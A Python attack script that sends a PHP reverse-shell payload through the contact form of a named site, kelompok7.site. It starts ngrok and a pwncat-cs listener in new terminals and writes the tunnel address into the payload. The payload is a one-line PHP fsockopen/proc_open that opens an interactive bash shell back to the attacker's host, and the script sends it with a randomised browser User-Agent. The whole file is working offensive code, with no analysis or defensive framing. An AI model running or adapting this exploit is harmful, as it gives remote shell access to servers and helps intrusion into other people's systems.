import requests
import random
import subprocess
import time

# Commands to open pwncat and ngrok in separate terminals
pwncat_command = ["gnome-terminal", "--", "pwncat-cs", "-lp", "31337"]
ngrok_command = ["gnome-terminal", "--", "ngrok", "tcp", "31337"]

# URL for the POST request
url = "https://kelompok7.site/inc/sendMessage.php"

# Data template with placeholders for ngrok address and port
data_template = {
    "name": "asdasd",
    "email": "asdasd@email.com",
    "subject": "asdasd",
    "message": "<?php $sock=fsockopen('NGROK-VPS', NGROK-PORT); $proc=proc_open('/bin/bash -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes); ?>"
}

# List of User-Agent strings
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

headers = {"User-Agent": random.choice(user_agents)}

def start_ngrok():
    """Starts ngrok in a new terminal."""
    print("Starting ngrok in a new terminal...")
    subprocess.Popen(ngrok_command)
    time.sleep(5)  # Allow ngrok to fully initialize

def get_ngrok_tcp_address():
    """Retrieve the public TCP address from ngrok's API."""
    try:
        print("Fetching ngrok TCP address...")
        response = requests.get("http://localhost:4040/api/tunnels")
        if response.status_code == 200:
            tunnels = response.json().get("tunnels", [])
            for tunnel in tunnels:
                if tunnel["proto"] == "tcp":
                    address = tunnel["public_url"].replace("tcp://", "")
                    return address
        print("Failed to retrieve ngrok address.")
    except Exception as e:
        print(f"An error occurred while fetching ngrok address: {e}")
    return None

def main():
    try:
        # Start ngrok in a separate terminal
        start_ngrok()

        # Retrieve ngrok TCP address
        ngrok_address = None
        while not ngrok_address:  # Keep retrying until the address is available
            ngrok_address = get_ngrok_tcp_address()
            if not ngrok_address:
                print("Retrying to fetch ngrok address...")
                time.sleep(2)

        print(f"ngrok TCP address: {ngrok_address}")

        # Split ngrok address into IP and port
        ngrok_ip, ngrok_port = ngrok_address.split(":")

        # Replace placeholders in the PHP payload
        data = data_template.copy()
        data["message"] = data["message"].replace("NGROK-VPS", ngrok_ip).replace("NGROK-PORT", ngrok_port)

        # Start pwncat in a new terminal
        print("Starting pwncat-cs in a new terminal...")
        subprocess.Popen(pwncat_command)

        # Allow time for pwncat to initialize
        time.sleep(3)

        # Send the POST request
        response = requests.post(url, data=data, headers=headers)
        if response.status_code == 200:
            print("POST request successful.")
            response_text = response.text.replace(
                'Pesan berhasil dikirim! <br>Pesan anda : ', ''
            ).replace(f'{data["message"]}<br><br>', '')
            print("Response cleaned:")
            print(response_text)
        else:
            print(f"Request failed with status code: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"An error occurred while sending the POST request: {e}")

if __name__ == "__main__":
    main()
